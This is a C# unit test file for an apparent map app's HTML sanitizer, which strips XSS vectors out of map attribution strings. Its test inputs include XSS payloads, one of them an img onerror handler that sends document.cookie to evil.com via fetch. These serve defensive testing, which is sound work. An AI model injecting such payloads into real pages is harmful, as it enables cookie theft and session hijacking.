using Wayfarer.Util;
using Xunit;

namespace Wayfarer.Tests.Util;

/// <summary>
/// Tests for HTML sanitization utilities to ensure XSS prevention.
/// </summary>
public class HtmlSanitizationTests
{
    [Fact]
    public void SanitizeAttribution_RemovesScriptTags()
    {
        var malicious = "&copy; OSM<script>alert('xss')</script>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("<script>", result);
        Assert.DoesNotContain("alert", result);
        // HtmlSanitizer decodes &copy; to © (Unicode character)
        Assert.Contains("©", result);
        Assert.Contains("OSM", result);
    }

    [Fact]
    public void SanitizeAttribution_RemovesEventHandlers()
    {
        var malicious = "<a href=\"https://osm.org\" onclick=\"evil()\">OSM</a>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("onclick", result);
        Assert.Contains("href=\"https://osm.org\"", result);
        Assert.Contains("OSM", result);
    }

    [Fact]
    public void SanitizeAttribution_RemovesImgOnerror()
    {
        var malicious = "<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("<img", result);
        Assert.DoesNotContain("onerror", result);
        Assert.DoesNotContain("fetch", result);
    }

    [Fact]
    public void SanitizeAttribution_AllowsSafeAnchorTags()
    {
        var safe = "&copy; <a href=\"https://openstreetmap.org\" target=\"_blank\" title=\"OSM\">OpenStreetMap</a> contributors";

        var result = HtmlSanitization.SanitizeAttribution(safe);

        Assert.Contains("<a href=\"https://openstreetmap.org\"", result);
        Assert.Contains("target=\"_blank\"", result);
        Assert.Contains("title=\"OSM\"", result);
        Assert.Contains("OpenStreetMap</a>", result);
        // HtmlSanitizer decodes &copy; to © (Unicode character)
        Assert.Contains("©", result);
    }

    [Fact]
    public void SanitizeAttribution_AllowsSpanStrongEm()
    {
        var safe = "<span class=\"attr\"><strong>Map data</strong> &copy; <em>OSM</em></span>";

        var result = HtmlSanitization.SanitizeAttribution(safe);

        Assert.Contains("<span", result);
        Assert.Contains("<strong>", result);
        Assert.Contains("<em>", result);
    }

    [Fact]
    public void SanitizeAttribution_BlocksJavascriptUrls()
    {
        var malicious = "<a href=\"javascript:alert('xss')\">Click me</a>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("javascript:", result);
        // The tag may remain but href should be stripped
        Assert.Contains("Click me", result);
    }

    [Fact]
    public void SanitizeAttribution_BlocksDataUrls()
    {
        var malicious = "<a href=\"data:text/html,<script>alert('xss')</script>\">Click</a>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("data:", result);
        Assert.DoesNotContain("<script>", result);
    }

    [Fact]
    public void SanitizeAttribution_ReturnsEmptyForNull()
    {
        var result = HtmlSanitization.SanitizeAttribution(null);

        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void SanitizeAttribution_ReturnsEmptyForWhitespace()
    {
        var result = HtmlSanitization.SanitizeAttribution("   ");

        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void SanitizeAttribution_PreservesHtmlEntities()
    {
        var withEntities = "&copy; OpenStreetMap &amp; contributors &lt;2024&gt;";

        var result = HtmlSanitization.SanitizeAttribution(withEntities);

        // HtmlSanitizer decodes common entities to their Unicode equivalents
        Assert.Contains("©", result);
        Assert.Contains("contributors", result);
        // &lt; and &gt; remain encoded or become < >
        Assert.Contains("2024", result);
    }

    [Fact]
    public void SanitizeAttribution_RemovesCssExpressions()
    {
        var malicious = "<span style=\"background:url(javascript:alert('xss'))\">Text</span>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("style=", result);
        Assert.DoesNotContain("javascript:", result);
        Assert.Contains("Text", result);
    }

    [Fact]
    public void SanitizeAttribution_HandlesNestedMaliciousContent()
    {
        var malicious = "<a href=\"https://osm.org\"><img src=x onerror=\"alert(1)\">OSM</a>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("<img", result);
        Assert.DoesNotContain("onerror", result);
        Assert.Contains("<a href=\"https://osm.org\"", result);
        Assert.Contains("OSM</a>", result);
    }

    [Fact]
    public void SanitizeAttribution_HandlesTypicalOsmAttribution()
    {
        var typical = "&copy; <a href=\"https://www.openstreetmap.org/copyright\">OpenStreetMap</a> contributors";

        var result = HtmlSanitization.SanitizeAttribution(typical);

        // HtmlSanitizer decodes &copy; to © but preserves structure
        Assert.Contains("©", result);
        Assert.Contains("<a href=\"https://www.openstreetmap.org/copyright\"", result);
        Assert.Contains("OpenStreetMap</a>", result);
        Assert.Contains("contributors", result);
    }

    [Fact]
    public void SanitizeAttribution_HandlesCartoAttribution()
    {
        var carto = "&copy; OpenStreetMap contributors &copy; <a href=\"https://carto.com/attributions\">CARTO</a>";

        var result = HtmlSanitization.SanitizeAttribution(carto);

        // HtmlSanitizer decodes &copy; to ©
        Assert.Contains("©", result);
        Assert.Contains("OpenStreetMap contributors", result);
        Assert.Contains("<a href=\"https://carto.com/attributions\"", result);
        Assert.Contains("CARTO</a>", result);
    }

    [Fact]
    public void SanitizeAttribution_RemovesSvgWithOnload()
    {
        var malicious = "<svg onload=\"alert('xss')\"><circle r=\"10\"/></svg>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("<svg", result);
        Assert.DoesNotContain("onload", result);
    }

    [Fact]
    public void SanitizeAttribution_RemovesIframeTags()
    {
        var malicious = "<iframe src=\"https://evil.com\"></iframe>";

        var result = HtmlSanitization.SanitizeAttribution(malicious);

        Assert.DoesNotContain("<iframe", result);
    }
}
